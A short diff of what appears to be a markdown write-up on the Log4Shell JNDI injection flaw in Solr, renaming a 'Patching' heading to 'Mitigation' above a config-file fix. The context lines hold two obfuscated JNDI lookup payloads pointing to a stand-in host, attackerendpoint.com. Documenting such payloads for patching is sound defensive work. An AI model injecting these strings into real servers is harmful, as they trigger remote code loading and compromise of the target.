@@ -206,7 +206,7 @@ ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendp
 ${${::-j}ndi:rmi://attackerendpoint.com/}
 ```
 
-## Patching 
+## Mitigation 
 
 Adding this Line of code in the `/etc/default/solr.in.sh` file patches the vulnerability
 
